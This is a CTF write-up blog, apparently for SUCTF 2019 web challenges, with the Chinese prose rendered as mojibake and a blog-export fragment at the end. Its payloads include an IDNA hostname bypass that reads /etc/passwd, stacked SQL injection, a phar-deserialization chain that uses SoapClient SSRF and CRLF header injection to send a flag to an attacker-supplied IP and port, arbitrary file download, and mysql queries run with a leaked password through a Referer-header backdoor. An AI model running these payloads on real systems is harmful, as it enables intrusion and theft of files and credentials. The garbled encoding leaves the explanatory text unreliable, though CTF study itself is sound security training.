<p>çœ‹è¿™ä¸ªæºç å¾ˆç®€å•ï¼Œå°±æ˜¯è¦ä½ æ„é€ å‡ºç¬¬ä¸‰æ¬¡åˆ¤æ–­çš„æ—¶å€™æ˜¯suctf.ccä½†æ˜¯åœ¨å‰ä¸¤ä¸ªåˆ¤æ–­çš„æ—¶å€™åˆä¸èƒ½æ˜¯suctf.ccï¼Œæ‰€ä»¥å°±æ˜¯å…¶ä¸­çš„å­—ç¬¦åœ¨ç¬¬ä¸‰æ¬¡åˆ¤æ–­å‰å¤„ç†åè¦å˜æˆsuctf.ccäº†ã€‚<br>å‚è€ƒï¼šï¼š<a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdfï¼ˆé˜”ä»¥å‘ç°ï¼Œè¿™é¢˜çš„æºç å’Œé‡Œé¢çš„ä¾‹å­å¾ˆåƒå“¦ï¼‰" target="_blank" rel="noopener">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdfï¼ˆé˜”ä»¥å‘ç°ï¼Œè¿™é¢˜çš„æºç å’Œé‡Œé¢çš„ä¾‹å­å¾ˆåƒå“¦ï¼‰</a><br>Unicode/Letterlike Symbolså­—ç¬¦é˜”ä»¥ä»è¿™å–ï¼š<a href="https://en.wiktionary.org/wiki/Appendix:Unicode/Letterlike_Symbols" target="_blank" rel="noopener">https://en.wiktionary.org/wiki/Appendix:Unicode/Letterlike_Symbols</a></p>
<p>åˆ©ç”¨â„‚æ¥æ›¿æ¢.ccä¸­çš„ä»cï¼Œåœ¨æœ€åå‡ºæ¥åä¼šæ¢å¤æˆc,ä¹Ÿå°±æˆåŠŸç»•è¿‡äº†ifåˆ¤æ–­ï¼Œé˜”ä»¥ä¿®æ”¹ä¸ªæºç ç”¨æ¥æµ‹è¯•</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">import urllib</span><br><span class="line">from urllib import parse</span><br><span class="line">from urllib.parse import urlsplit, urlunsplit</span><br><span class="line"></span><br><span class="line"><span class="comment">#url = []</span></span><br><span class="line">url = <span class="string">"file://suctf.câ„‚/../../../etc/passwd"</span></span><br><span class="line">host = parse.urlparse(url).hostname</span><br><span class="line"><span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">    print(<span class="string">'first'</span>)</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>)</span><br><span class="line">print(<span class="string">'1 '</span>+host)</span><br><span class="line">parts = list(urlsplit(url))</span><br><span class="line">host = parts[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">    print(<span class="string">'sec'</span>)</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">2</span>)</span><br><span class="line">print(<span class="string">'2 '</span>+host)</span><br><span class="line">newhost = []</span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">    newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line"><span class="comment">#å»æ‰ url ä¸­çš„ç©ºæ ¼</span></span><br><span class="line">finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">host = parse.urlparse(finalUrl).hostname</span><br><span class="line"><span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">    print(<span class="string">'3 '</span>+host)</span><br><span class="line">    print(finalUrl)</span><br><span class="line">    <span class="comment">#print(urllib.request.urlopen(finalUrl).read())</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'???'</span>)</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/2019/08/19/2019-SUCTF-Web-writeup/8418106-a8f13bb95f2257e5.png" alt></p>
<p>æ‰€ä»¥æ‹¿å»é¢˜ç›®æ‰“ä¸€æ³¢å°±é˜”ä»¥ä»»æ„æ–‡ä»¶è¯»å–äº†ï¼Œå¦‚ä¸‹</p>
<p><img src="/2019/08/19/2019-SUCTF-Web-writeup/8418106-98bfe0de4c4310c8.png" alt></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯è¯»å„ç§æ–‡ä»¶ï¼ˆè¿™é‡Œå°±ä¸å†™è¾›é…¸è¿‡ç¨‹ï¼Œä»¥åŠæˆ‘ä»¬æ˜¯å¦‚ä½•ä¸¢äº†ä¸€è¡€çš„äº†ï¼‰ï¼Œå¿…é¡»å–·ä¸€ä¸‹/etc/hosts</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span>	localhost</span><br><span class="line">::<span class="number">1</span>	localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::<span class="number">0</span>	ip6-localnet</span><br><span class="line">ff00::<span class="number">0</span>	ip6-mcastprefix</span><br><span class="line">ff02::<span class="number">1</span>	ip6-allnodes</span><br><span class="line">ff02::<span class="number">2</span>	ip6-allrouters</span><br><span class="line"><span class="number">172.19.0.2</span>	2b44a80d20fc    è¿™ç‰¹ä¹ˆå†…ç½‘åœ°å€</span><br><span class="line"><span class="number">127.0.0.1</span>     suctf.cc</span><br></pre></td></tr></table></figure>
<p>çœ‹åˆ°äº†ä¸ªå†…ç½‘åœ°å€ï¼Œä¸‹æ„è¯†ä»¥ä¸ºæ˜¯è¦æ—¥å†…ç½‘äº†ï¼Œä¸€ç›´ç ”ç©¶è¿™ä¸ªé¢˜ç›®æºç æ€ä¹ˆssrfï¼Œä»¥åŠæ€ä¹ˆæ—¥åˆ°æ²¡å¼€ç«¯å£çš„uwsgiï¼Œä¸€åº¦ä¸€ä½åˆæ˜¯ä¸€ä¸ªæœ€æ–°çš„æŠ€æœ¯ï¼Œæ‰¾äº†åŠå¤©çš„éªšæ“ä½œã€‚<br>è¯»nginxé…ç½® /etc/nginx/conf.d/nginx.conf(ä¹Ÿæ²¡å•¥)</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line"><span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line"><span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">@app</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> <span class="variable">@app</span> &#123;</span><br><span class="line"><span class="attribute">include</span> uwsgi_params;</span><br><span class="line"><span class="attribute">uwsgi_pass</span> unix:///tmp/uwsgi.sock;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> /static &#123;</span><br><span class="line"><span class="attribute">alias</span> /app/static;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸ºä»€ä¹ˆä¸¢ä¸€è¡€å°±æ˜¯åœ¨è¿™ï¼Œæ²¡å»æƒ³è¯»å…¶ä»–ä½ç½®çš„é…ç½®æ–‡ä»¶<del>~</del><br>åæ¥è¯»/usr/local/nginx/conf/nginx.conf   å°±è¿™ä¸ªé¬¼ä¸œè¥¿</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line"><span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line"><span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">@app</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> <span class="variable">@app</span> &#123;</span><br><span class="line"><span class="attribute">include</span> uwsgi_params;</span><br><span class="line"><span class="attribute">uwsgi_pass</span> unix:///tmp/uwsgi.sock;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> /static &#123;</span><br><span class="line"><span class="attribute">alias</span> /app/static;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># location /flag &#123;</span></span><br><span class="line"><span class="comment"># alias /usr/fffffflag;      #flagå°±åœ¨è¿™ï¼Œç«Ÿç„¶ä¸åœ¨å†…ç½‘é‡Œï¼ï¼ï¼</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥è¯»flagå°±å¥½äº†</p>
<p><img src="/2019/08/19/2019-SUCTF-Web-writeup/8418106-44f608314a9fa489.png" alt></p>
<p>ï¼ˆæ³¨ï¼šä»ä»Šå¤©å¼€å§‹æ”¶é›†å­—å…¸ï¼Œä»¥åè¯»ä¸œè¥¿éƒ½ç”¨å­—å…¸æ¥è¯»ï¼‰</p>
<h3 id="0x04-easy-sql"><a href="#0x04-easy-sql" class="headerlink" title="0x04 easy_sql"></a>0x04 easy_sql</h3><p>è¿™é¢˜æ¯”è¾ƒæ„å¤–ï¼Œé¢˜ç›®å’Œå¼ºç½‘æ¯ä¸€æ ·æ˜¯ä¸€ä¸ªå †å æ³¨å…¥ï¼Œä¸è¿‡åšäº†æ›´å¤šé™åˆ¶ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1;<span class="keyword">show</span> <span class="keyword">databases</span>;   <span class="comment">#æŸ¥åº“</span></span><br><span class="line">1;<span class="keyword">show</span> <span class="keyword">tables</span>;      <span class="comment">#æŸ¥è¡¨</span></span><br></pre></td></tr></table></figure>
<p>å½“å‰åº“åªæœ‰ä¸€ä¸ªFlagè¡¨ï¼Œè€Œä¸”è¯­å¥é•¿åº¦é™åˆ¶äº†40ä½ï¼Œæ‰€ä»¥æƒ³è¦åƒå¼ºç½‘ä¸€æ ·çš„æ”¹è¡¨é¢å’Œé¢„ç¼–è¯‘çš„æ“ä½œéƒ½ä¸å¯ä»¥äº†ï¼Œå¹¶ä¸”è¿‡æ»¤äº†fromç­‰ç­‰ï¼ˆfuzzä¸‹å°±å¥½äº†ï¼Œè¿™æ¬¡æ”¾å‡ºäº†selectï¼‰ï¼Œæœ¬ä»¥ä¸ºè¯­å¥æ˜¯ç±»ä¼¼select xxx  from  xxx where id = ï¼ˆï¼‰è¿™æ ·çš„ï¼Œç»“æœåæ¥å¬è¯´æ³„éœ²çš„æ˜¯è¿™æ ·çš„</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="built_in">select</span> $<span class="variable">_GET</span>[<span class="string">'query'</span>] || <span class="built_in">flag</span> <span class="keyword">from</span> <span class="built_in">flag</span></span><br></pre></td></tr></table></figure>
<p>æˆ‘æ‹¿flagçš„æ—¶å€™å°±æ˜¯è¾“äº†ä¸ª</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">*,<span class="number">1</span>      è¿™ä¸œè¥¿æˆ‘éƒ½è§‰å¾—ç¥äº†ï¼Œè¿™éƒ½å‡ºäº†</span><br></pre></td></tr></table></figure>

<p><img src="/2019/08/19/2019-SUCTF-Web-writeup/8418106-b7afd0fcb8f2c52a.png" alt></p>
<p>æ‰€ä»¥æ²¡æ¯›ç—…ï¼Œè¿™ä¸ªç¡®å®èƒ½å‡ºã€‚</p>
<h3 id="0x05-upload-lib2"><a href="#0x05-upload-lib2" class="headerlink" title="0x05 upload lib2"></a>0x05 upload lib2</h3><p>ç”±äºæœ¨æœ‰æ—¶é—´ï¼Œè¿™é¢˜æœ¨æœ‰å»çœ‹ï¼Œæ‰€ä»¥å°±æ˜¯è®°å½•ä¸‹å¤ç°è¿‡ç¨‹äº†ï¼Œé¢˜ç›®ç»™äº†æºç ï¼Œæ‰€ä»¥å°±æ˜¯è¿›è¡Œä»£ç å®¡è®¡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ad</span></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        getFlag(<span class="keyword">$this</span>-&gt;ip, <span class="keyword">$this</span>-&gt;port);</span><br><span class="line">        <span class="comment">//ä½¿ç”¨ä½ è‡ªå·±çš„æœåŠ¡å™¨ç›‘å¬ä¸€ä¸ªç¡®ä¿å¯ä»¥æ”¶åˆ°æ¶ˆæ¯çš„ç«¯å£æ¥è·å–flag</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'admin'</span>]))&#123;</span><br><span class="line">        </span><br><span class="line">        $ip = $_POST[<span class="string">'ip'</span>];     <span class="comment">//ä½ ç”¨æ¥è·å–flagçš„æœåŠ¡å™¨ip</span></span><br><span class="line">        $port = $_POST[<span class="string">'port'</span>]; <span class="comment">//ä½ ç”¨æ¥è·å–flagçš„æœåŠ¡å™¨ç«¯å£</span></span><br><span class="line"></span><br><span class="line">        $clazz = $_POST[<span class="string">'clazz'</span>];</span><br><span class="line">        $func1 = $_POST[<span class="string">'func1'</span>];</span><br><span class="line">        $func2 = $_POST[<span class="string">'func2'</span>];</span><br><span class="line">        $func3 = $_POST[<span class="string">'func3'</span>];</span><br><span class="line">        $arg1 = $_POST[<span class="string">'arg1'</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">'arg2'</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">'arg3'</span>];</span><br><span class="line">        $admin = <span class="keyword">new</span> Ad($ip, $port, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);</span><br><span class="line">        $admin-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå°±æ˜¯è¯´éœ€è¦é€šè¿‡SSRFæ¥ååºåˆ—åŒ–è§¦å‘getFlagå‡½æ•°ï¼Œæ‰€ä»¥ç»§ç»­æŸ¥çœ‹ä»£ç </p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#class.php</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></span><br><span class="line">    function getMIME()&#123;</span><br><span class="line">        <span class="variable">$finfo</span> = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">        <span class="variable">$this</span>-&gt;type = finfo_file(<span class="variable">$finfo</span>, <span class="variable">$this</span>-&gt;file_name);</span><br><span class="line">        finfo_close(<span class="variable">$finfo</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></span><br></pre></td></tr></table></figure>
<p>å‚è€ƒzsxçš„æ–‡ç« ï¼š<a href="https://blog.zsxsoft.com/post/38ï¼ŒæŸ¥çœ‹finfo_fileçš„åº•å±‚ä»£ç " target="_blank" rel="noopener">https://blog.zsxsoft.com/post/38ï¼ŒæŸ¥çœ‹finfo_fileçš„åº•å±‚ä»£ç </a></p>
<p><img src="/2019/08/19/2019-SUCTF-Web-writeup/8418106-2eb4eb4e3879ec67.png" alt></p>
<p>é˜”ä»¥å‘ç°finfo_fileä¹Ÿè°ƒç”¨äº†ï¼Œæ‰€ä»¥finfo_fileä¹Ÿæ˜¯èƒ½å¤Ÿè§¦å‘pharååºåˆ—åŒ–çš„ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨SoapClientæ¥é€šè¿‡SSRFä»¥POSTæ–¹å¼è®¿é—®åˆ°admin.phpæ–‡ä»¶ã€‚ä¸è¿‡åœ¨func.phpä¸­åˆåšäº†é™åˆ¶</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'class.php'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">"url"</span>])) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(preg_match(<span class="string">'/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i'</span>,$_POST[<span class="string">'url'</span>]))&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">"Go away!"</span>);</span></span><br><span class="line"><span class="php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        $file_path = $_POST[<span class="string">'url'</span>];</span></span><br><span class="line"><span class="php">        $file = <span class="keyword">new</span> File($file_path);</span></span><br><span class="line"><span class="php">        $file-&gt;getMIME();</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your file type is '$file' &lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>pharåè®®ä¸èƒ½å‡ºç°åœ¨å¼€å¤´ï¼Œè¿˜æ˜¯zxsé‚£ç¯‡æ–‡ç« é‡Œå†™çš„</p>
<p><img src="/2019/08/19/2019-SUCTF-Web-writeup/8418106-c0a0e47b6a5acf50.png" alt></p>
<p>ä¹Ÿå°±æ˜¯è¯´é˜”ä»¥æ„é€ ç»•è¿‡ä¸€ä¸‹æ¥è°ƒç”¨pharåè®®ï¼Œè¿™é‡Œçš„å¹ä¸€ä¸‹altman(<a href="https://altman.vip/)ï¼Œfuzzåˆ°ä¸€ä¸ªå¯ä»¥åˆ©ç”¨çš„æ–¹æ³•" target="_blank" rel="noopener">https://altman.vip/)ï¼Œfuzzåˆ°ä¸€ä¸ªå¯ä»¥åˆ©ç”¨çš„æ–¹æ³•</a></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">php:<span class="regexp">//</span>filter<span class="regexp">/resource=phar:/</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥æ¥ä¸‹æ¥å°±æ˜¯ç”Ÿæˆä¸€ä¸ªpharè„šæœ¬ï¼Œä¸Šä¼ åé€šè¿‡funcè§¦å‘å°±å¥½äº†</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file_name;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $type;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $func = <span class="string">"SoapClient"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;file_name = <span class="keyword">array</span>(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'location'</span> =&gt; <span class="string">"http://127.0.0.1/admin.php"</span>, <span class="string">'uri'</span> =&gt; <span class="string">"c"</span>, <span class="string">'user_agent'</span> =&gt; <span class="string">"catcat\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 133\r\n\r\nip=[yourip]&amp;port=[port]&amp;admin=1&amp;clazz=ArrayIterator&amp;func1=append&amp;func2=append&amp;func3=append&amp;arg1=1&amp;arg2=1&amp;arg3=1\r\n\r\n\r\n"</span>));</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$o = <span class="keyword">new</span> File();</span></span><br><span class="line"><span class="php">$phar=<span class="keyword">new</span> Phar(<span class="string">'poc.phar'</span>);</span></span><br><span class="line"><span class="php">$phar-&gt;startBuffering();</span></span><br><span class="line"><span class="php">$phar-&gt;setStub(<span class="string">"GIF89a&lt; ?php __HALT_COMPILER(); ?&gt;"</span>);</span></span><br><span class="line"><span class="php">$phar-&gt;setMetadata($o);</span></span><br><span class="line"><span class="php">$phar-&gt;addFromString(<span class="string">"foo.txt"</span>,<span class="string">"bar"</span>);</span></span><br><span class="line"><span class="php">$phar-&gt;stopBuffering();</span></span><br></pre></td></tr></table></figure>
<p>ç»•åæ”¹ä¸ªåç¼€ä¸Šä¼ ï¼Œvpsä¸Šç›‘å¬ä¸€ä¸‹ç«¯å£ï¼Œåˆ°func.phpè§¦å‘å°±å¯ä»¥äº†</p>
<p><img src="/2019/08/19/2019-SUCTF-Web-writeup/8418106-385183b39aa436c5.png" alt></p>
<h3 id="0x06-Cocktailâ€™s-Remix"><a href="#0x06-Cocktailâ€™s-Remix" class="headerlink" title="0x06 Cocktailâ€™s Remix"></a>0x06 Cocktailâ€™s Remix</h3><p>èµ›åæ‰å¼€å§‹çœ‹ï¼Œé¢˜ç›®æ”¾äº†ä¸€ä¸ªrobots.txt</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">User-<span class="string">agent:</span> *</span><br><span class="line"><span class="string">Disallow:</span> /info.php</span><br><span class="line"><span class="string">Disallow:</span> /download.php</span><br><span class="line"><span class="string">Disallow:</span> /config.php</span><br></pre></td></tr></table></figure>
<p>ç»™äº†ä¸ªphpinfoé¡µé¢ä»¥åŠä¸€ä¸ªdownload.phpï¼ˆæŠ“åŒ…çœ‹ä¸€ä¸‹å¯ä»¥çŸ¥é“æ˜¯å¯ä»¥æ„é€ æˆä»»æ„æ–‡ä»¶ä¸‹è½½çš„ï¼‰</p>
<p><img src="/2019/08/19/2019-SUCTF-Web-writeup/8418106-399e3b6a8c8c1990.png" alt></p>
<p>é€šè¿‡payload:<code>download.php?filename=xxxx</code>å®ç°ä»»æ„æ–‡ä»¶è¯»å–ï¼Œå¼€å§‹è¯»å„ç§é…ç½®æ–‡ä»¶ã€‚</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line">#/etc/hosts</span><br><span class="line"><span class="number">127.0.0.1</span> localhost</span><br><span class="line">::<span class="number">1</span> localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::<span class="number">0</span> ip6-localnet</span><br><span class="line">ff00::<span class="number">0</span> ip6-mcastprefix</span><br><span class="line">ff02::<span class="number">1</span> ip6-allnodes</span><br><span class="line">ff02::<span class="number">2</span> ip6-allrouters</span><br><span class="line"><span class="number">172.77.120.11</span> MysqlServer</span><br><span class="line"><span class="number">172.77.120.10</span> f8a7f2ca8591     åˆæ˜¯å†…ç½‘åœ°å€</span><br></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment"># download.php</span></span><br><span class="line">&lt;?php</span><br><span class="line">$filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">header(<span class="string">"Content-Disposition: attachment;filename="</span>.$filename);</span><br><span class="line">header(<span class="string">'Content-Length: '</span>.filesize($filename));</span><br><span class="line">readfile($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># config.php</span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="regexp">//</span><span class="variable">$db_server</span> = <span class="string">"MysqlServer"</span>;</span><br><span class="line"><span class="regexp">//</span><span class="variable">$db_username</span> = <span class="string">"dba"</span>;</span><br><span class="line"><span class="regexp">//</span><span class="variable">$db_password</span> = <span class="string">"rNhHmmNkN3xu4MBYhm"</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>é¢˜ç›®ç»™phpinfoé¡µé¢è‚¯å®šæ˜¯è¦æˆ‘ä»¬å»çœ‹ä¸Šé¢çš„éƒ¨åˆ†ä¿¡æ¯çš„</p>
<p><img src="/2019/08/19/2019-SUCTF-Web-writeup/8418106-f320690c3de21a8c.png" alt></p>
<p>å…¶ä¸­åŠ è½½äº†ä¸€ä¸ªmod_cocktailï¼ˆè¿™ä¸ªä¸œè¥¿è¦æ˜¯ä¸è¯´ä»–æ˜¯åé—¨æˆ‘å°±å»æƒ³åŠæ³•æ—¥å†…ç½‘äº†ï¼‰æ¨¡å—ï¼Œä¸‹è½½ä¸‹æ¥ç”¨idaçœ‹çœ‹ï¼Œè·¯å¾„ï¼š<code>/usr/lib/apache2/modules/mod_cocktail.so</code>ã€‚</p>
<p><img src="/2019/08/19/2019-SUCTF-Web-writeup/8418106-ef2867d800f8cc85.png" alt></p>
<p>é€†å‘å¸ˆå‚…è¯´è¿™å°±æ˜¯ä¸€ä¸ªheaderçš„åé—¨ï¼Œè·å–Refferå­—æ®µçš„å€¼ï¼Œbase64è§£ç åç›´æ¥æ”¾bashä¸­è¿è¡Œï¼Œæ‰€ä»¥å°±é˜”ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤æ‰§è¡Œäº†</p>
<p><img src="/2019/08/19/2019-SUCTF-Web-writeup/8418106-d46e46e40e87f6e3.png" alt></p>
<p>æ“ä½œäº†ä¸€ç•ªï¼Œå‘ç°æœ¨æœ‰æƒé™å†™shellï¼Œä¹Ÿæ²¡æ³•åå¼¹shellå‡ºæ¥ã€‚</p>
<p><img src="/2019/08/19/2019-SUCTF-Web-writeup/8418106-1605b362db0f68d2.png" alt></p>
<p>åœ¨configç»™äº†æ•°æ®åº“çš„æœåŠ¡å™¨å’Œé…ç½®ä¿¡æ¯ï¼Œæ‰€ä»¥flagåº”è¯¥æ˜¯è¦å»æ•°æ®åº“ä¸­ï¼Œæ‰€ä»¥åˆ©ç”¨æ•°æ®åº“è¿æ¥è¯­å¥å»æŸ¥åº“</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">#mysql -hMysqlServer -udba -prNhHmmNkN3xu4MBYhm -e <span class="string">"show databases;"</span> &gt; <span class="regexp">/tmp/</span><span class="keyword">read</span>.txt</span><br><span class="line"></span><br><span class="line">Database</span><br><span class="line">information_schema</span><br><span class="line">flag</span><br></pre></td></tr></table></figure>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="meta">#mysql -hMysqlServer -udba -prNhHmmNkN3xu4MBYhm -e <span class="meta-string">"use flag;select * from flag"</span> &gt; /tmp/read.txt</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">flag</span></span><br><span class="line"><span class="built_in">flag</span>&#123;Ea3y_apAcH3_m0d_BaCkd00rx_fLaG&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x07-iCloudMusic"><a href="#0x07-iCloudMusic" class="headerlink" title="0x07 iCloudMusic"></a>0x07 iCloudMusic</h3><p><strong>è¿™ä¸ªä¸ä¼šäº†ï¼Œå¤§å¸ˆå‚…ä»¬èµ›ä¸­å·®ä¸€æ­¥å°±å‡ºï¼Œç­‰è´´å¤§å¸ˆå‚…ä»¬çš„é“¾æ¥äº†</strong></p>
]]></content>
      <categories>
        <category>Cyc1eçš„CTFä¹‹è·¯</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>.htaccess</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸­å…³æ‘ç¬¬ä¸‰å±Šæ–°å…´é¢†åŸŸä¸“é¢˜èµ›ç½‘ç»œä¸ä¿¡æ¯å®‰å…¨é¢†åŸŸä¸“é¡¹èµ›Web_WP</title>
    <url>/2019/08/15/%E4%B8%AD%E5%85%B3%E6%9D%91%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%96%B0%E5%85%B4%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A2%98%E8%B5%9B%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9BWeb-WP/</url>
    <content><![CDATA[<h3 id="0x01-Game"><a href="#0x01-Game" class="headerlink" title="0x01 Game"></a>0x01 Game</h3><p>è¿™é¢˜è¿·å¾—å¾ˆï¼ŒæŸ¥çœ‹ä¸‹ä¸€ä¸‹jsï¼ŒæŒ‰ç€ajaxå‘é€è¯·æ±‚å¾—æ¡ä»¶è‡ªå·±å‘ä¸€ä¸ªè¯·æ±‚å°±å¥½äº†</p>
<p><img src="/2019/08/15/%E4%B8%AD%E5%85%B3%E6%9D%91%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%96%B0%E5%85%B4%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A2%98%E8%B5%9B%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9BWeb-WP/8418106-e70774e2e39d1c0a.png" alt></p>
<p>payload:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">/socre.php</span><br><span class="line">POST:<span class="attribute">score</span>=15</span><br></pre></td></tr></table></figure>

<h3 id="0x02-who-are-you"><a href="#0x02-who-are-you" class="headerlink" title="0x02 who_are_you"></a>0x02 who_are_you</h3><p>XXEçš„é¢˜ç›®ï¼Œæ²¡æœ‰ä»»ä½•é™åˆ¶ï¼Œç›´æ¥ä»»æ„æ–‡ä»¶è¯»å–â€¦â€¦</p>
